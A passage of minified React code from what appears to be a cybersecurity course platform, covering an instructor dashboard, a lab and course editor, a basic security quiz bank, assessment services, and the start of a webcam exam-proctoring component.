text-white rounded",children:"Create Draft"}),e.jsx("button",{type:"button",onClick:()=>E(!0),disabled:d,className:"px-3 py-2 bg-emerald-600 text-white rounded",children:"Create & Publish"})]})]})]})})]})})},Mj=()=>{const[a,n]=v.useState(""),[s,i]=v.useState(""),[o,c]=v.useState("beginner"),[d,m]=v.useState([{id:"root",name:"root",type:"directory",children:[]}]),[f,x]=v.useState(null),p=(j,N)=>{const k=prompt(`Enter ${N} name:`);if(!k)return;const F={id:Math.random().toString(36).substr(2,9),name:k,type:N,children:N==="directory"?[]:void 0,content:N==="file"?"":void 0},T=R=>R.map(S=>S.id===j&&S.type==="directory"?{...S,children:[...S.children||[],F]}:S.children?{...S,children:T(S.children)}:S);m(T(d))},b=j=>{const N=k=>k.filter(F=>F.id!==j).map(F=>F.children?{...F,children:N(F.children)}:F);m(N(d)),f?.id===j&&x(null)},w=j=>e.jsx("div",{className:"pl-4 border-l border-[#00FF88]/10",children:j.map(N=>e.jsxs("div",{className:"my-1",children:[e.jsxs("div",{className:`flex items-center justify-between p-2 rounded cursor-pointer transition-colors ${f?.id===N.id?"bg-[#00FF88]/20 text-[#00FF88]":"hover:bg-[#00FF88]/5 text-[#EAEAEA]"}`,onClick:()=>x(N),children:[e.jsxs("div",{className:"flex items-center gap-2",children:[N.type==="directory"?e.jsx(Ic,{className:"h-4 w-4 text-[#00B37A]"}):e.jsx(Fm,{className:"h-4 w-4 text-[#00FF88]"}),e.jsx("span",{className:"font-mono text-sm",children:N.name})]}),e.jsxs("div",{className:"flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity",children:[N.type==="directory"&&e.jsxs(e.Fragment,{children:[e.jsx("button",{onClick:k=>{k.stopPropagation(),p(N.id,"file")},className:"p-1 hover:text-[#00FF88]",children:e.jsx(cd,{className:"h-3 w-3"})}),e.jsx("button",{onClick:k=>{k.stopPropagation(),p(N.id,"directory")},className:"p-1 hover:text-[#00FF88]",children:e.jsx(Ic,{className:"h-3 w-3"})})]}),N.id!=="root"&&e.jsx("button",{onClick:k=>{k.stopPropagation(),b(N.id)},className:"p-1 hover:text-red-400",children:e.jsx(Ad,{className:"h-3 w-3"})})]})]}),N.children&&w(N.children)]},N.id))});return e.jsx("div",{className:"min-h-screen bg-[#000000] text-[#EAEAEA] p-6 animate-fade-in",children:e.jsxs("div",{className:"max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-3 gap-6",children:[e.jsxs("div",{className:"space-y-6",children:[e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/20 rounded-xl p-6",children:[e.jsxs("h2",{className:"text-xl font-bold text-[#00FF88] mb-4 flex items-center gap-2",children:[e.jsx(He,{className:"h-5 w-5"})," Lab Configuration"]}),e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs font-mono text-[#00B37A] mb-1",children:"MISSION TITLE"}),e.jsx("input",{type:"text",value:a,onChange:j=>n(j.target.value),className:"w-full bg-black border border-[#00FF88]/20 rounded p-2 text-[#EAEAEA] focus:border-[#00FF88] outline-none transition-colors",placeholder:"e.g., Operation Blackout"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs font-mono text-[#00B37A] mb-1",children:"DIFFICULTY"}),e.jsxs("select",{value:o,onChange:j=>c(j.target.value),className:"w-full bg-black border border-[#00FF88]/20 rounded p-2 text-[#EAEAEA] focus:border-[#00FF88] outline-none",children:[e.jsx("option",{value:"beginner",children:"Recruit (Beginner)"}),e.jsx("option",{value:"intermediate",children:"Operative (Intermediate)"}),e.jsx("option",{value:"advanced",children:"Elite (Advanced)"})]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-xs font-mono text-[#00B37A] mb-1",children:"BRIEFING"}),e.jsx("textarea",{value:s,onChange:j=>i(j.target.value),className:"w-full bg-black border border-[#00FF88]/20 rounded p-2 text-[#EAEAEA] focus:border-[#00FF88] outline-none h-24 resize-none",placeholder:"Mission objectives..."})]})]})]}),e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/20 rounded-xl p-6 h-[500px] overflow-y-auto",children:[e.jsxs("h2",{className:"text-xl font-bold text-[#00FF88] mb-4 flex items-center gap-2",children:[e.jsx(Ic,{className:"h-5 w-5"})," File System"]}),w(d)]})]}),e.jsx("div",{className:"lg:col-span-2 space-y-6",children:e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/20 rounded-xl p-6 h-full flex flex-col",children:[e.jsxs("div",{className:"flex items-center justify-between mb-4 border-b border-[#00FF88]/10 pb-4",children:[e.jsxs("h2",{className:"text-xl font-bold text-[#00FF88] flex items-center gap-2",children:[e.jsx(Fm,{className:"h-5 w-5"}),f?f.name:"Select a file to edit"]}),e.jsxs("div",{className:"flex gap-2",children:[e.jsxs("button",{className:"px-4 py-2 bg-[#00FF88]/10 text-[#00FF88] border border-[#00FF88]/20 rounded hover:bg-[#00FF88]/20 transition-all flex items-center gap-2 font-mono text-sm",children:[e.jsx(Bt,{className:"h-4 w-4"})," TEST RUN"]}),e.jsxs("button",{className:"px-4 py-2 bg-[#00FF88] text-black rounded font-bold hover:bg-[#00CC66] transition-all flex items-center gap-2",children:[e.jsx(S0,{className:"h-4 w-4"})," SAVE LAB"]})]})]}),f&&f.type==="file"?e.jsx("textarea",{value:f.content,onChange:j=>{const N=k=>k.map(F=>F.id===f.id?{...F,content:j.target.value}:F.children?{...F,children:N(F.children)}:F);m(N(d)),x({...f,content:j.target.value})},className:"flex-1 bg-black font-mono text-sm text-[#00FF88] p-4 rounded border border-[#00FF88]/10 outline-none resize-none focus:border-[#00FF88]/30",spellCheck:!1}):e.jsxs("div",{className:"flex-1 flex flex-col items-center justify-center text-[#00B37A]/50 border-2 border-dashed border-[#00FF88]/10 rounded",children:[e.jsx(He,{className:"h-16 w-16 mb-4"}),e.jsx("p",{className:"font-mono",children:"Select a file from the tree to edit its contents"})]})]})})]})})},$j=()=>{const[a,n]=v.useState(""),[s,i]=v.useState("");return e.jsx("div",{className:"min-h-screen bg-[#000000] text-[#EAEAEA] p-6 animate-fade-in",children:e.jsxs("div",{className:"max-w-5xl mx-auto space-y-6",children:[e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsxs("h1",{className:"text-3xl font-black text-white uppercase tracking-tighter",children:["Course ",e.jsx("span",{className:"text-[#00FF88]",children:"Editor"})]}),e.jsx("p",{className:"text-[#00B37A] font-mono text-sm mt-1",children:"AUTHOR CLASSIFIED MATERIAL"})]}),e.jsxs("div",{className:"flex gap-3",children:[e.jsxs("button",{className:"px-4 py-2 bg-[#00FF88]/10 text-[#00FF88] border border-[#00FF88]/20 rounded hover:bg-[#00FF88]/20 transition-all flex items-center gap-2 font-mono text-sm",children:[e.jsx(gs,{className:"h-4 w-4"})," PREVIEW"]}),e.jsxs("button",{className:"px-4 py-2 bg-[#00FF88] text-black rounded font-bold hover:bg-[#00CC66] transition-all flex items-center gap-2",children:[e.jsx(S0,{className:"h-4 w-4"})," PUBLISH MODULE"]})]})]}),e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/20 rounded-xl p-6",children:[e.jsx("label",{className:"block text-xs font-mono text-[#00B37A] mb-2",children:"MODULE DESIGNATION"}),e.jsx("input",{type:"text",value:a,onChange:o=>n(o.target.value),className:"w-full bg-black border border-[#00FF88]/20 rounded p-3 text-xl font-bold text-[#EAEAEA] focus:border-[#00FF88] outline-none transition-colors placeholder-[#00B37A]/30",placeholder:"e.g., Advanced Network Reconnaissance"})]}),e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/20 rounded-xl overflow-hidden flex flex-col h-[600px]",children:[e.jsxs("div",{className:"flex items-center gap-1 p-2 border-b border-[#00FF88]/10 bg-black/50",children:[e.jsx("button",{className:"p-2 hover:bg-[#00FF88]/10 rounded text-[#00B37A] hover:text-[#00FF88] transition-colors",title:"Bold",children:e.jsx(Vv,{className:"h-4 w-4"})}),e.jsx("button",{className:"p-2 hover:bg-[#00FF88]/10 rounded text-[#00B37A] hover:text-[#00FF88] transition-colors",title:"Italic",children:e.jsx(sy,{className:"h-4 w-4"})}),e.jsx("div",{className:"w-px h-4 bg-[#00FF88]/10 mx-2"}),e.jsx("button",{className:"p-2 hover:bg-[#00FF88]/10 rounded text-[#00B37A] hover:text-[#00FF88] transition-colors",title:"List",children:e.jsx(ny,{className:"h-4 w-4"})}),e.jsx("button",{className:"p-2 hover:bg-[#00FF88]/10 rounded text-[#00B37A] hover:text-[#00FF88] transition-colors",title:"Code Block",children:e.jsx(Kv,{className:"h-4 w-4"})}),e.jsx("div",{className:"w-px h-4 bg-[#00FF88]/10 mx-2"}),e.jsx("button",{className:"p-2 hover:bg-[#00FF88]/10 rounded text-[#00B37A] hover:text-[#00FF88] transition-colors",title:"Insert Image",children:e.jsx(ry,{className:"h-4 w-4"})}),e.jsx("button",{className:"p-2 hover:bg-[#00FF88]/10 rounded text-[#00B37A] hover:text-[#00FF88] transition-colors",title:"Insert Link",children:e.jsx(F0,{className:"h-4 w-4"})})]}),e.jsx("textarea",{value:s,onChange:o=>i(o.target.value),className:"flex-1 bg-black p-6 text-[#EAEAEA] outline-none resize-none font-sans leading-relaxed",placeholder:"Begin transmission..."}),e.jsxs("div",{className:"p-2 bg-black/50 border-t border-[#00FF88]/10 text-xs text-[#00B37A] font-mono flex justify-end",children:[s.length," CHARS // ",s.split(/\s+/).filter(Boolean).length," WORDS"]})]})]})})},Bj=({activeTab:a,onTabChange:n})=>{const{logout:s}=Ie(),i=[{id:"dashboard",label:"Dashboard",icon:Fd},{id:"lab-builder",label:"Lab Builder",icon:He},{id:"course-editor",label:"Course Editor",icon:Mt},{id:"profile",label:"Profile",icon:zt}];return e.jsxs("div",{className:"w-72 bg-[#0A0F0A] border-r border-[#00FF88]/10 h-[calc(100vh-4rem)] flex flex-col sticky top-16",children:[e.jsx("div",{className:"p-4 flex-1 overflow-y-auto custom-scrollbar",children:e.jsx("div",{className:"space-y-2",children:i.map(o=>{const c=o.icon,d=a===o.id;return e.jsxs("button",{onClick:()=>n(o.id),className:Ir("w-full flex items-center space-x-3 px-4 py-3.5 rounded-xl transition-all duration-300 group relative overflow-hidden",d?"bg-gradient-to-r from-[#00FF88]/20 to-[#00FF88]/5 text-[#00FF88] shadow-[0_0_20px_rgba(0,255,136,0.15)] border border-[#00FF88]/20":"text-[#00B37A] hover:text-[#EAEAEA] hover:bg-[#00FF88]/5 border border-transparent hover:shadow-lg hover:shadow-[#00FF88]/5"),children:[e.jsx("div",{className:Ir("p-2 rounded-lg transition-all duration-300",d?"bg-[#00FF88]/10":"bg-[#00FF88]/5 group-hover:bg-[#00FF88]/10"),children:e.jsx(c,{className:Ir("h-5 w-5 transition-transform duration-300 group-hover:scale-110",d?"text-[#00FF88]":"text-[#00B37A] group-hover:text-[#EAEAEA]")})}),e.jsx("span",{className:"font-medium tracking-wide text-sm",children:o.label}),d&&e.jsx("div",{className:"absolute right-3 animate-fade-in",children:e.jsx(Yt,{className:"h-4 w-4 text-primary"})})]},o.id)})})}),e.jsxs("div",{className:"p-4 border-t border-[#00FF88]/10 bg-[#0A0F0A]/50 backdrop-blur-sm",children:[e.jsxs("div",{className:"mb-4 px-4 py-3 bg-gradient-to-br from-[#0A0F0A] to-[#000000] rounded-xl border border-[#00FF88]/10 shadow-inner",children:[e.jsx("p",{className:"text-xs font-medium text-[#00B37A] uppercase tracking-wider mb-2",children:"Clearance Level"}),e.jsxs("div",{className:"flex justify-between items-center",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-2xl font-bold text-[#EAEAEA]",children:"Instructor"}),e.jsx("p",{className:"text-xs text-[#00FF88]",children:"Level 4 Access"})]}),e.jsx("div",{className:"h-10 w-10 rounded-full bg-[#00FF88]/10 flex items-center justify-center border border-[#00FF88]/20",children:e.jsx(ze,{className:"h-5 w-5 text-[#00FF88]"})})]})]}),e.jsxs("button",{onClick:s,className:"w-full flex items-center justify-center space-x-2 px-4 py-3 rounded-xl text-[#00B37A] hover:text-red-400 hover:bg-red-500/10 border border-transparent hover:border-red-500/20 transition-all duration-300 group",children:[e.jsx(Eo,{className:"h-5 w-5 group-hover:scale-110 transition-transform"}),e.jsx("span",{className:"font-medium",children:"Sign Out"})]})]})]})},Tn=({children:a,className:n="",variant:s="default",...i})=>{const o="inline-flex items-center rounded-full border px-2.5 py-0.5 text-xs font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2",c={default:"border-transparent bg-primary text-primary-foreground hover:bg-primary/80",secondary:"border-transparent bg-secondary text-secondary-foreground hover:bg-secondary/80",destructive:"border-transparent bg-destructive text-destructive-foreground hover:bg-destructive/80",outline:"text-foreground",success:"border-transparent bg-green-500/15 text-green-500 hover:bg-green-500/25",warning:"border-transparent bg-yellow-500/15 text-yellow-500 hover:bg-yellow-500/25",cyber:"border-cyber-500/50 bg-cyber-500/10 text-cyber-400 shadow-[0_0_10px_rgba(14,165,233,0.2)]"};return e.jsx("div",{className:`${o} ${c[s]} ${n}`,...i,children:a})},cp=()=>{const[a,n]=v.useState([]),[s,i]=v.useState(!1),[o,c]=v.useState(null),[d,m]=v.useState(!0),[f,x]=v.useState("dashboard"),{user:p}=Ie();v.useEffect(()=>{p&&p.id&&b()},[p]);const b=async()=>{try{if(m(!0),!p?.id)return;const k=await lt.getCoursesByTeacher(p.id);n(k)}catch(k){console.error("Failed to load courses:",k)}finally{m(!1)}},w=async k=>{if(window.confirm("Are you sure you want to delete this course?"))try{await lt.deleteCourse(k),n(a.filter(F=>F.id!==k))}catch(F){console.error("Failed to delete course:",F)}},j=async k=>{try{const F=await lt.updateCourse(k.id,{is_published:!k.is_published});n(a.map(T=>T.id===k.id?F:T))}catch(F){console.error("Failed to update course:",F)}},N=()=>d?e.jsx("div",{className:"min-h-screen flex items-center justify-center",children:e.jsx("div",{className:"animate-spin rounded-full h-12 w-12 border-b-2 border-primary"})}):f==="lab-builder"?e.jsx(Mj,{}):f==="course-editor"?e.jsx($j,{}):f==="profile"?e.jsxs("div",{className:"p-6",children:[e.jsx("h2",{className:"text-2xl font-bold text-white mb-4",children:"Instructor Profile"}),e.jsx("p",{className:"text-muted-foreground",children:"Profile management coming soon."})]}):e.jsxs("div",{className:"p-6 space-y-8 min-h-screen animate-fade-in",children:[e.jsxs("div",{className:"flex flex-col md:flex-row md:items-center justify-between gap-4",children:[e.jsxs("div",{children:[e.jsx("h1",{className:"text-4xl font-bold bg-gradient-to-r from-white via-white/80 to-white/60 bg-clip-text text-transparent",children:"Teacher Dashboard"}),e.jsx("p",{className:"text-muted-foreground mt-2 text-lg",children:"Create and manage your cybersecurity courses"})]}),e.jsx("div",{className:"flex gap-3",children:e.jsx($t,{variant:"cyber",size:"lg",onClick:()=>i(!0),leftIcon:e.jsx(dy,{className:"h-5 w-5"}),className:"shadow-lg shadow-primary/20",children:"Create Course"})})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-4 gap-6",children:[e.jsxs(xt,{variant:"cyber",hover:!0,className:"relative overflow-hidden group",children:[e.jsx("div",{className:"absolute -right-6 -top-6 h-24 w-24 rounded-full bg-blue-500/10 blur-2xl group-hover:blur-3xl transition-all duration-500"}),e.jsxs(gt,{className:"p-6 flex items-center justify-between relative z-10",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-muted-foreground text-sm font-medium",children:"My Courses"}),e.jsx("p",{className:"text-3xl font-bold text-foreground mt-2",children:a.length})]}),e.jsx("div",{className:"p-3 rounded-xl bg-blue-500/10 border border-blue-500/20",children:e.jsx(xr,{className:"h-8 w-8 text-blue-400"})})]})]}),e.jsxs(xt,{variant:"cyber",hover:!0,className:"relative overflow-hidden group",children:[e.jsx("div",{className:"absolute -right-6 -top-6 h-24 w-24 rounded-full bg-green-500/10 blur-2xl group-hover:blur-3xl transition-all duration-500"}),e.jsxs(gt,{className:"p-6 flex items-center justify-between relative z-10",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-muted-foreground text-sm font-medium",children:"Published"}),e.jsx("p",{className:"text-3xl font-bold text-foreground mt-2",children:a.filter(k=>k.is_published).length})]}),e.jsx("div",{className:"p-3 rounded-xl bg-green-500/10 border border-green-500/20",children:e.jsx(gs,{className:"h-8 w-8 text-green-400"})})]})]}),e.jsxs(xt,{variant:"cyber",hover:!0,className:"relative overflow-hidden group",children:[e.jsx("div",{className:"absolute -right-6 -top-6 h-24 w-24 rounded-full bg-purple-500/10 blur-2xl group-hover:blur-3xl transition-all duration-500"}),e.jsxs(gt,{className:"p-6 flex items-center justify-between relative z-10",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-muted-foreground text-sm font-medium",children:"Total Students"}),e.jsx("p",{className:"text-3xl font-bold text-foreground mt-2",children:a.reduce((k,F)=>k+(F.enrollment_count||0),0)})]}),e.jsx("div",{className:"p-3 rounded-xl bg-purple-500/10 border border-purple-500/20",children:e.jsx(Ut,{className:"h-8 w-8 text-purple-400"})})]})]}),e.jsxs(xt,{variant:"cyber",hover:!0,className:"relative overflow-hidden group",children:[e.jsx("div",{className:"absolute -right-6 -top-6 h-24 w-24 rounded-full bg-yellow-500/10 blur-2xl group-hover:blur-3xl transition-all duration-500"}),e.jsxs(gt,{className:"p-6 flex items-center justify-between relative z-10",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-muted-foreground text-sm font-medium",children:"Avg Rating"}),e.jsx("p",{className:"text-3xl font-bold text-foreground mt-2",children:a.length>0?(a.reduce((k,F)=>k+(F.rating||0),0)/a.length).toFixed(1):"0.0"})]}),e.jsx("div",{className:"p-3 rounded-xl bg-yellow-500/10 border border-yellow-500/20",children:e.jsx(N0,{className:"h-8 w-8 text-yellow-400"})})]})]})]}),e.jsxs(xt,{variant:"glass",className:"border-white/5 bg-white/[0.02]",children:[e.jsx(fs,{children:e.jsx(ms,{children:"My Courses"})}),e.jsx(gt,{children:a.length===0?e.jsxs("div",{className:"text-center py-12",children:[e.jsx("div",{className:"bg-white/5 rounded-full p-6 inline-block mb-4",children:e.jsx(xr,{className:"h-12 w-12 text-muted-foreground"})}),e.jsx("h3",{className:"text-lg font-medium text-foreground mb-2",children:"No courses yet"}),e.jsx("p",{className:"text-muted-foreground mb-6 max-w-md mx-auto",children:"Start creating your first cybersecurity course to share with students."}),e.jsx($t,{variant:"cyber",onClick:()=>i(!0),children:"Create Your First Course"})]}):e.jsx("div",{className:"grid gap-4",children:a.map(k=>e.jsx("div",{className:"group bg-white/5 rounded-xl p-6 border border-white/10 hover:border-primary/30 hover:bg-white/[0.07] transition-all duration-300",children:e.jsxs("div",{className:"flex flex-col md:flex-row md:items-start justify-between gap-4",children:[e.jsxs("div",{className:"flex-1 space-y-3",children:[e.jsxs("div",{className:"flex items-center flex-wrap gap-3",children:[e.jsx("h3",{className:"text-xl font-bold text-foreground group-hover:text-primary transition-colors",children:k.title}),e.jsx(Tn,{variant:k.difficulty==="advanced"?"destructive":k.difficulty==="intermediate"?"warning":"success",children:k.difficulty}),e.jsx(Tn,{variant:k.is_published?"success":"warning",children:k.is_published?"Published":"Draft"})]}),e.jsx("p",{className:"text-muted-foreground line-clamp-2",children:k.description}),e.jsxs("div",{className:"flex items-center flex-wrap gap-6 text-sm text-muted-foreground",children:[e.jsxs("div",{className:"flex items-center gap-1.5",children:[e.jsx(Ut,{className:"h-4 w-4"}),e.jsxs("span",{children:[k.enrollment_count," students"]})]}),e.jsxs("div",{className:"flex items-center gap-1.5",children:[e.jsx(Va,{className:"h-4 w-4 text-yellow-500"}),e.jsxs("span",{children:[(k.rating||0).toFixed(1)," rating"]})]}),e.jsxs("div",{className:"flex items-center gap-1.5",children:[e.jsx(Pt,{className:"h-4 w-4"}),e.jsxs("span",{children:[k.estimated_hours,"h estimated"]})]}),e.jsxs("div",{className:"flex items-center gap-1.5",children:[e.jsx(xo,{className:"h-4 w-4"}),e.jsx("span",{children:new Date(k.created_at||Date.now()).toLocaleDateString()})]})]})]}),e.jsxs("div",{className:"flex items-center gap-2 self-start",children:[e.jsx($t,{variant:"ghost",size:"icon",onClick:()=>j(k),title:k.is_published?"Unpublish":"Publish",className:k.is_published?"text-yellow-500 hover:text-yellow-400":"text-green-500 hover:text-green-400",children:e.jsx(gs,{className:"h-4 w-4"})}),e.jsx($t,{variant:"ghost",size:"icon",onClick:()=>c(k),title:"Edit",className:"text-blue-500 hover:text-blue-400",children:e.jsx(py,{className:"h-4 w-4"})}),e.jsx($t,{variant:"ghost",size:"icon",onClick:()=>w(k.id),title:"Delete",className:"text-red-500 hover:text-red-400",children:e.jsx(Ad,{className:"h-4 w-4"})})]})]})},k.id))})})]}),(s||o)&&e.jsx(Dj,{onSuccess:k=>{n(o?F=>F.map(T=>T.id===k.id?k:T):F=>[k,...F]),i(!1),c(null)},onCancel:()=>{i(!1),c(null)},course:o})]});return e.jsxs("div",{className:"min-h-screen bg-gradient-to-br from-slate-900 to-slate-800",children:[e.jsx(Td,{}),e.jsxs("div",{className:"flex",children:[e.jsx(Bj,{activeTab:f,onTabChange:k=>x(k)}),e.jsx("main",{className:"flex-1 overflow-y-auto h-[calc(100vh-4rem)]",children:N()})]})]})},Dt=[{id:"1",question:"What does CIA stand for in cybersecurity?",options:["Central Intelligence Agency","Confidentiality, Integrity, Availability","Cyber Intelligence Analysis","Computer Information Assurance"],correctAnswer:1,explanation:"CIA in cybersecurity refers to the three fundamental principles: Confidentiality, Integrity, and Availability.",difficulty:"easy"},{id:"2",question:"Which of the following is NOT a type of malware?",options:["Virus","Trojan","Firewall","Ransomware"],correctAnswer:2,explanation:"A firewall is a security system that monitors network traffic, not a type of malware.",difficulty:"easy"},{id:"3",question:"What is SQL injection?",options:["A type of network attack","A method to inject malicious SQL code into applications","A database optimization technique","A type of encryption"],correctAnswer:1,explanation:"SQL injection is a code injection technique that attackers use to exploit vulnerabilities in applications.",difficulty:"medium"},{id:"4",question:"What is the primary purpose of encryption?",options:["Speed up data transfer","Compress data","Protect data confidentiality","Reduce storage space"],correctAnswer:2,explanation:"Encryption transforms data into an unreadable format to protect its confidentiality.",difficulty:"easy"},{id:"5",question:"Which port is commonly used for HTTPS?",options:["80","443","22","21"],correctAnswer:1,explanation:"Port 443 is the standard port for HTTPS (HTTP Secure) connections.",difficulty:"medium"},{id:"6",question:"What is a zero-day vulnerability?",options:["A vulnerability that has been patched","A vulnerability unknown to security vendors","A vulnerability in day-zero systems","A type of denial of service attack"],correctAnswer:1,explanation:"A zero-day vulnerability is a security flaw that is unknown to security vendors and has no available patch.",difficulty:"hard"},{id:"7",question:"What does MFA stand for?",options:["Multiple Factor Authentication","Multi-Factor Authentication","Master File Access","Managed File Access"],correctAnswer:1,explanation:"MFA stands for Multi-Factor Authentication, a security method requiring multiple verification factors.",difficulty:"easy"},{id:"8",question:"Which of the following is a social engineering attack?",options:["DDoS","Phishing","Buffer overflow","Man-in-the-middle"],correctAnswer:1,explanation:"Phishing is a social engineering attack that tricks users into revealing sensitive information.",difficulty:"easy"},{id:"9",question:"What is the principle of least privilege?",options:["Giving users maximum access","Giving users minimum necessary access","Removing all user privileges","Sharing privileges among users"],correctAnswer:1,explanation:"The principle of least privilege means giving users only the minimum access necessary to perform their job.",difficulty:"medium"},{id:"10",question:"What is a honeypot in cybersecurity?",options:["A type of malware","A decoy system to attract attackers","A backup system","A type of firewall"],correctAnswer:1,explanation:"A honeypot is a decoy system designed to attract and detect unauthorized access attempts.",difficulty:"medium"},{id:"11",question:"Which protocol is used for secure file transfer?",options:["FTP","HTTP","SFTP","SMTP"],correctAnswer:2,explanation:"SFTP (SSH File Transfer Protocol) provides secure file transfer capabilities.",difficulty:"medium"},{id:"12",question:"What is cross-site scripting (XSS)?",options:["A network protocol","A type of injection attack","A backup method","A firewall rule"],correctAnswer:1,explanation:"XSS is a type of injection attack where malicious scripts are injected into trusted websites.",difficulty:"medium"},{id:"13",question:"What does SIEM stand for?",options:["Security Information and Event Management","System Integration and Event Monitoring","Security Integration and Error Management","System Information and Error Monitoring"],correctAnswer:0,explanation:"SIEM stands for Security Information and Event Management, used for real-time security monitoring.",difficulty:"hard"},{id:"14",question:"Which of the following is NOT a common password attack?",options:["Brute force","Dictionary attack","Rainbow table","Buffer overflow"],correctAnswer:3,explanation:"Buffer overflow is a memory corruption attack, not specifically a password attack.",difficulty:"medium"},{id:"15",question:"What is the purpose of a digital certificate?",options:["To encrypt data","To verify identity and enable secure communication","To store passwords","To backup data"],correctAnswer:1,explanation:"Digital certificates verify identity and enable secure, authenticated communication.",difficulty:"medium"},{id:"16",question:"What is a APT in cybersecurity?",options:["Application Protection Tool","Advanced Persistent Threat","Automated Patch Tool","Access Point Technology"],correctAnswer:1,explanation:"APT stands for Advanced Persistent Threat, a prolonged and targeted cyberattack.",difficulty:"hard"},{id:"17",question:"Which encryption algorithm is considered secure for current use?",options:["DES","MD5","AES-256","SHA-1"],correctAnswer:2,explanation:"AES-256 is currently considered a secure encryption algorithm for most applications.",difficulty:"medium"},{id:"18",question:"What is the main purpose of penetration testing?",options:["To install software","To identify and exploit vulnerabilities","To backup data","To train users"],correctAnswer:1,explanation:"Penetration testing involves systematically testing systems to identify and exploit vulnerabilities.",difficulty:"medium"},{id:"19",question:"What does OWASP stand for?",options:["Open Web Application Security Project","Organized Web Application Security Protocol","Online Web Application Security Platform","Official Web Application Security Process"],correctAnswer:0,explanation:"OWASP stands for Open Web Application Security Project, a nonprofit focused on web security.",difficulty:"easy"},{id:"20",question:"Which of the following is a characteristic of a strong password?",options:["Uses only lowercase letters","Contains personal information","Is at least 12 characters with mixed case, numbers, and symbols","Is easy to remember and commonly used"],correctAnswer:2,explanation:"Strong passwords should be at least 12 characters long and include a mix of uppercase, lowercase, numbers, and symbols.",difficulty:"easy"}];class Uj{async startAttempt(n,s="initial"){const i=crypto.randomUUID();try{const{error:o}=await Z.from("assessment_responses").insert([{attempt_id:i,user_id:n,question_id:"INIT",selected_answer:0,confidence_level:3,is_correct:!0,context:s}]);if(o)throw o;return await Z.from("assessment_responses").delete().eq("attempt_id",i).eq("question_id","INIT"),{id:i,user_id:n,context:s}}catch(o){const c=o instanceof Error?o.message:String(o);return console.warn("Assessment attempt bootstrap failed, falling back to client-only attempt:",c),{id:i,user_id:n,context:s}}}async submitAnswer(n){const s={attempt_id:n.attempt_id??crypto.randomUUID(),user_id:n.user_id,question_id:n.question_id,selected_answer:n.selected_answer,confidence_level:n.confidence_level,is_correct:n.is_correct,context:n.context??"initial"},{error:i}=await Z.from("assessment_responses").insert([s]);if(i)throw new Error(`Failed to submit answer: ${i.message}`);return!0}async getAttemptResults(n){const{data:s,error:i}=await Z.from("assessment_responses").select("question_id, is_correct, confidence_level, context").eq("attempt_id",n);if(i)throw new Error(`Failed to fetch results: ${i.message}`);return s??[]}}const zm=new Uj;class zj{async analyzeAssessment(n){const s=`Given the following Q/A results with confidence, produce a JSON with strengths and gaps grouped by OWASP-ish topics.
Return {"strengths":[{"topic":"...","accuracy":0.0,"confidenceAvg":0}],"gaps":[...]}
Data: ${JSON.stringify(n)}`,i=await zs.chat(s,"Return strict JSON only.");try{const o=i.indexOf("{"),c=i.lastIndexOf("}");return JSON.parse(i.slice(o,c+1))}catch{const o={};for(const f of n){const x=f.question_id.split(":")[0]||"general";o[x]??={c:0,ok:0,confSum:0},o[x].c+=1,o[x].confSum+=f.confidence_level,f.is_correct&&(o[x].ok+=1)}const c=Object.entries(o).map(([f,x])=>({topic:f,accuracy:x.ok/x.c,confidenceAvg:x.confSum/x.c})),d=c.filter(f=>f.accuracy>=.7&&f.confidenceAvg>=3.5),m=c.filter(f=>f.accuracy<.7||f.confidenceAvg<3);return{strengths:d,gaps:m}}}}const qj=new zj;class Wj{async allocateInitialPath(n,s,i){const o=new Set(i.gaps.map(x=>x.topic)),{data:c,error:d}=await Z.from("course_modules").select("id, title, module_order").eq("course_id",s).order("module_order",{ascending:!0});if(d)throw new Error(`Failed to fetch modules: ${d.message}`);const f=(c||[]).map(x=>({...x,priority:o.size&&o.has((x.title.split(" ")[0]||"general").toLowerCase())?0:1})).sort((x,p)=>x.priority-p.priority||x.module_order-p.module_order).map(x=>({user_id:n,course_id:s,module_id:x.id,completed:!1,quiz_score:0,topic:(x.title.split(" ")[0]||"general").toLowerCase(),source:"adaptive"}));if(f.length){const{error:x}=await Z.from("user_progress").upsert(f);if(x)throw new Error(`Failed to allocate path: ${x.message}`)}return f.map(x=>x.module_id)}async rebalance(n,s){const{data:i,error:o}=await Z.from("user_progress").select("module_id, completed").eq("user_id",n).eq("course_id",s).order("updated_at",{ascending:!1});if(o)throw new Error(`Failed to read progress: ${o.message}`);return i??[]}}const pd=new Wj,Vj="https://cdn.jsdelivr.net/npm/opencv.js@4.5.5/dist/opencv.js",Hj="haarcascade_frontalface_default.xml",qm=!0,Gj=!1,dp=({videoRef:a,onViolation:n,onEndExam:s,enabled:i=!0,threshold:o=3,onStatusChange:c,onViolationWarning:d,opencvUrl:m=Vj,modelsPath:f="/models"})=>{const x=v.useRef(null),p=v.useRef(null),[b,w]=v.useState("initializing"),j=v.useRef(null),N=v.useRef(0),k=v.useRef(null),F=v.useRef(!1),T=v.useRef(0),R=v.useRef(0),S=v.useRef(null),U=v.useRef(null),z=v.useRef({opencv:null,faceapi:null}),[H,G]=v.useState(!1),[O,V]=v.useState("none"),B=v.useRef(null),ae=v.useRef(!0),xe=v.useRef(0),ye=2500,[ne,fe]=v.useState([]),ie=v.useRef(0),ee=q=>{const ve={id:++ie.current,ts:Date.now(),msg:q};fe(Ne=>[ve,...Ne].slice(0,50))},M=async q=>{try{await 